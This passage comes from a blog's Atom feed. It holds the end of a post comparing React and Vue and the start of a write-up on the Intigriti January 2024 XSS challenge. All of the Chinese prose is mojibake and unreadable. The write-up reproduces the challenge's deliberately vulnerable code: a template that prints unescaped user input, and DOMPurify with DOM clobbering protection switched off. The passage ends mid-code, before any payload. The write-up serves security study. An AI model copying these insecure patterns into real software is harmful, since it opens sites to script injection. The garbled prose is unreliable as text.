éåŠå¹´ä¹‹å¾Œè¦ç¶­è­·ï¼Œå·²ç¶“å¯ä»¥é æœŸåˆ°ç¶­è­·æ€§å¯èƒ½æœƒè¼ƒå·®çš„æƒ…æ³ä¸‹ï¼Œé¸æ“‡ä¸‹é™æ¯”è¼ƒé«˜çš„ Vue ä¼¼ä¹æœƒæ¯”è¼ƒå¥½ï¼Œè‡³å°‘ä½ æ”¹å¾—å‹•ã€‚</p><p>è€Œå¦å¤–ä¸€å€‹ä¹Ÿæ˜¯å¾åœ˜éšŠå‡ºç™¼çš„è§’åº¦æ˜¯ã€Œä¸Šæ‰‹é›£åº¦ã€ï¼Œå¦‚æœåœ˜éšŠå…§çš„äººæ‰‹æ¯”è¼ƒä¸è¶³ï¼Œå‰å¾Œç«¯è¦äº’ç›¸æ”¯æ´çš„è©±ï¼Œé‚£ Vue ä¹Ÿæ˜¯å€‹æœƒæ¯” React æ›´å¥½çš„é¸æ“‡ï¼Œå› ç‚ºæ›´å¥½å…¥é–€ï¼Œæ‰€ä»¥å°±ç®—ä¸ç†Ÿæ‚‰å‰ç«¯ä¹Ÿèƒ½å¤ å¿«é€Ÿä¸Šæ‰‹ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œå¾ç‹€æ…‹ç®¡ç†ä¾†çœ‹çš„è©±ï¼Œæˆ‘è¦ºå¾— Vue æ›´ç›´è¦ºä¹Ÿæ›´å¥½ä¸Šæ‰‹ä¸€é»ï¼Œè€Œ React çš„è©±ç¢ºå¯¦æ˜¯æ¯”è¼ƒè¤‡é›œã€‚</p><p>æ¥è‘—ä¾†è«‡ render çš„æ–¹å¼ï¼ŒReact å°±æ˜¯ JSX ä¸€è·¯åˆ°åº•ï¼Œæ•´å€‹ component å°±æ˜¯ä¸€å€‹ functionï¼Œè£¡é¢æ˜¯ JSXã€‚è€Œ Vue çš„è©±å‰‡æ˜¯æŠŠ template è·Ÿ functional åˆ†é–‹ï¼Œæˆ‘è¦ºå¾—å…©è€…å„æœ‰å…¶å„ªåŠ£ã€‚</p><p>å°æ–¼ä¸€äº›éœ€è¦ early return çš„ç‹€æ³ï¼Œä¾‹å¦‚èªªå¦‚æœæ˜¯è¼‰å…¥ä¸­å°±åªé¡¯ç¤º loadingï¼ŒReact æˆ‘è¦ºå¾—æœƒæ›´åŠ ç›´è¦ºä¸€é»ï¼Œå°± component çœ‹å€‹å‰å¹¾è¡Œå°±çŸ¥é“äº†ã€‚è€Œ Vue çš„è©±å‰‡æ˜¯ setup çš„åœ°æ–¹çœ‹å®Œé‚„è¦å†å›å»çœ‹ template æ‰èƒ½ç¢ºå®šã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œv-if èˆ‡ v-for é‚£äº›å…¶å¯¦æ»¿å¥½ç”¨çš„ï¼Œè€Œä¸” template çœ‹èµ·ä¾†ä¹Ÿæ¯”è¼ƒæ•´é½Šï¼Œåœ¨çµæ§‹æ²’æœ‰ç›¸å·®å¾ˆå¤šçš„æƒ…æ³ä¸‹å¯è®€æ€§æ¯”è¼ƒå¥½ã€‚</p><p>å„ªé»è¬›å®Œäº†ï¼Œä¾†è¬›ä¸€äº›ç¼ºé»ã€‚</p><p>ç¬¬ä¸€å€‹ç¼ºé»æ˜¯åœ¨ props çš„éƒ¨åˆ†æˆ‘è¦ºå¾— React æ›´åŠ ç›´è¦ºï¼Œå°±æ˜¯ function çš„åƒæ•¸è€Œå·²ï¼Œè€Œ Vue çš„è©±å‰‡æ˜¯è¦é¡å¤–å®šç¾©ï¼Œè€Œä¸”åœ¨å‚³å…¥çš„æ™‚å€™æå€¡çš„æ˜¯ kebab-caseï¼ŒåŸæœ¬å«åš <code>testProps</code> è¦æ”¹æˆ <code>test-props</code>ï¼Œæˆ‘è‡ªå·±ä¸æ˜¯å¾ˆå–œæ­¡é€™æ¨£ï¼Œå› ç‚ºå…©è€…ä¸ä¸€è‡´çš„è©±æœƒå°è‡´æœå°‹æœ‰é»å›°é›£ã€‚</p><p>é›–ç„¶èªªæˆ‘çœ‹æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥ç”¨ <code>testProps</code>ï¼Œä½†å®˜æ–¹æ–‡ä»¶æå€¡çš„ä½œæ³•ä¾ç„¶æ˜¯ <code>test-props</code>ã€‚</p><p>ç¬¬äºŒå€‹ç¼ºé»æ˜¯ä¸€å€‹æª”æ¡ˆåªèƒ½æœ‰ä¸€å€‹ componentï¼Œæˆ‘è¦ºå¾—é€™å€‹æ»¿ä¸å½ˆæ€§çš„ï¼Œæœƒå®¹æ˜“å‡ºç¾ä¸€å¤§å †å°çš„æª”æ¡ˆã€‚é›–ç„¶ä»¥å‰ä¹Ÿæœ‰äººåœ¨ React ä¸­æå€¡é€™ç¨®åšæ³•ï¼Œä¸€å€‹æª”æ¡ˆä¸€å€‹ componentï¼Œä½†æˆ‘èªç‚ºé‚£æ˜¯ä¸å¥½çš„ï¼Œå› ç‚ºæœ‰äº› component å¦‚æœä¸èƒ½è¢«å…¶ä»–å…ƒä»¶é‡ç”¨ï¼Œé‚£å°±æ‡‰è©²æ”¾åœ¨åŒå€‹æª”æ¡ˆï¼Œæ¯”è¼ƒå¥½æ‰¾ä¹Ÿæ¯”è¼ƒå¥½ç¶­è­·ã€‚</p><p>ä¸éé€™é»ä¼¼ä¹ä¹Ÿå¯ä»¥è§£æ±ºï¼Œæˆ‘æœ‰æŸ¥åˆ°ç›¸é—œçš„æ–¹æ³•ï¼š</p><ol><li><a href="https://michaelnthiessen.com/multiple-components-in-one-file">Multiple Components in One File</a></li><li><a href="https://codewithhugo.com/writing-multiple-vue-components-in-a-single-file/">Writing multiple Vue components in a single file</a></li></ol><p>é€™æ¨£çœ‹ä¸‹ä¾†ï¼Œå¥½åƒæˆ‘ä¸Šé¢æçš„å…©å€‹ç¼ºé»å…¶å¯¦éƒ½æœ‰æ–¹æ³•å¯ä»¥è§£æ±ºï¼Œç´”ç²¹æ˜¯æˆ‘ä¹‹å‰å° Vue ä¸å¤ ç†Ÿæ‰€ä»¥ä¸çŸ¥é“è€Œå·²ï¼Œä¹‹å¾Œå†ä¾†è©¦è©¦çœ‹ã€‚</p><h2><span id="ç¸½çµ">ç¸½çµ</span></h2><p>ä»¥ä¸Šå°±æ˜¯æˆ‘å°ä½¿ç”¨ Next.js 13.4 app router + RSC çš„å¿ƒå¾—ï¼Œä»¥åŠå¾å¯« React è½‰åˆ°å¯« Vue çš„å¿ƒå¾—ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œæ„Ÿæƒ³å¤§æ¦‚å°±æ˜¯ Vue ç¢ºå¯¦ç°¡å–®å¥½ä¸Šæ‰‹ï¼Œä½†é‚„éœ€è¦å†è§€å¯Ÿä¸€é™£å­ï¼Œç•¢ç«Ÿ code å¯«å¾—è¶Šå¤šæ‰æœƒè¶Šæœ‰æ„Ÿè¦ºï¼Œåƒæˆ‘é€™ç¨®åªå¯«äº†ä¸‰å››å€‹æœˆçš„ï¼Œé€šå¸¸é‚„åœ¨ç”œèœœæœŸï¼Œåªé«”é©—åˆ°å¥½è™•è€Œéå£è™•ã€‚ç•¶å¯«çš„ç¨‹å¼ç¢¼æ„ˆå¤šï¼Œå°ˆæ¡ˆä¹Ÿæ„ˆè¤‡é›œçš„æ™‚å€™ï¼Œæ‡‰è©²å°±æœƒé‡åˆ°ä¸€äº›ä¹‹å‰æ²’ç¢°éçš„å•é¡Œã€‚</p><p>æˆ–è¨±è¦å†å¯«å€‹ä¸€å…©å¹´æ‰æœƒæœ‰æ›´å¤šå¿ƒå¾—å§ï¼Ÿä¸çŸ¥é“é‚£æ™‚å€™çš„å‰ç«¯æœƒé•·æˆä»€éº¼æ¨£å­ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¦‚æœæœ‰çœ‹éæˆ‘çš„éƒ¨è½æ ¼çš„è©±ï¼Œæ‡‰è©²æœƒçŸ¥é“æˆ‘ä¸€ç›´éƒ½æ˜¯å¯« Reactï¼Œå®Œå…¨æ²’æœ‰ç¢°é Vueï¼Œä¹Ÿæ²’æœ‰ç¢°é Angularã€‚è‡ªå¾ 2015 å¹´æ¥è§¸åˆ° React å¾Œï¼Œå·¥ä½œä¸Šå°±ä¸€ç›´æ˜¯ç”¨ React äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œï¼Œæœ€è¿‘å› ç‚ºå·¥ä½œä¸Šçš„éœ€æ±‚ï¼Œæ‰€ä»¥é–‹å§‹å¯« Vue äº†ï¼Œè€Œå‰›å¥½ä¹Ÿæœ‰è®€è€…ä¾†å•æˆ‘å¾ React è·³åˆ° Vue çš„å¿ƒå¾—ï¼Œå› æ­¤é€™é‚Šå°±ç°¡å–®å¯«ä¸€ç¯‡ä¾†åˆ†äº«ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Intigriti 0124 XSS ç­†è¨˜</title>
    <link href="https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/"/>
    <id>https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/</id>
    <published>2024-02-17T04:40:00.000Z</published>
    <updated>2024-02-17T10:53:39.068Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šå€‹æœˆï¼ˆ2024 å¹´ 1 æœˆï¼‰çš„ Intigriti æŒ‘æˆ°éå¸¸æœ‰è¶£ï¼Œå‡ºé¡Œè€…æ˜¯ <a href="https://twitter.com/kevin_mizu">@kevin_mizu</a>ï¼Œä¹‹å‰ä¹Ÿå¸¸åœ¨æ¨ç‰¹ä¸Šçœ‹åˆ°ä»–å‡ºä¸€äº› client-side ç›¸é—œçš„é¡Œç›®ï¼Œè€Œé€™æ¬¡çš„é¡Œç›®å“è³ªä¹Ÿä¸€å¦‚æ—¢å¾€çš„å¾ˆå¥½ï¼Œå€¼å¾—å¯«ä¸€ç¯‡ç´€éŒ„ã€‚</p><p>é¡Œç›®çš„é€£çµåœ¨é€™é‚Šï¼Œæ²’æœ‰çœ‹éçš„è©±å¯ä»¥å…ˆå»çœ‹çœ‹ï¼š<a href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p><span id="more"></span><h2><span id="ä¼¼ä¹æ¯”æƒ³åƒä¸­ç°¡å–®">ä¼¼ä¹æ¯”æƒ³åƒä¸­ç°¡å–®ï¼Ÿ</span></h2><p>é¡Œç›®çš„ç¨‹å¼ç¢¼æ»¿ç°¡çŸ­çš„ï¼Œå…ˆä¾†çœ‹å‰ç«¯çš„éƒ¨åˆ†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹ HTML è€Œå·²ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hey &lt;%- name %>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Which repo are you looking for?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= search %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/img/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50px<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>35%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>homepage<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/jquery-3.7.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­é€™ä¸€æ®µ <code>&lt;h2&gt;Hey &lt;%- name %&gt;</code> æ˜¯èˆ‡å¾Œç«¯å”¯ä¸€æœ‰é—œçš„éƒ¨åˆ†ï¼Œæœƒåœ¨å¾Œç«¯ä½¿ç”¨ DOMPurify ä¾†é€²è¡Œ sanitizationï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">search</span><span class="token operator">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯é€™é‚Šçš„ <code>SANITIZE_DOM: false</code>ï¼Œé€™å€‹è¨­ç½®æœƒåœæ­¢å°æ–¼ DOM Clobbering çš„é˜²è­·ï¼Œå› æ­¤å¯ä»¥çŒœæ¸¬é€™é¡Œèˆ‡ DOM Clobbering æœ‰é—œï¼Œæ‰æœƒåˆ»æ„æŠŠé€™å€‹è¨­ç½®é—œæ‰ã€‚</p><p>è€Œæ•´é¡Œæœ€ä¸»è¦çš„é‚è¼¯éƒ½åœ¨ search å‡½å¼è£¡é¢äº†ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" 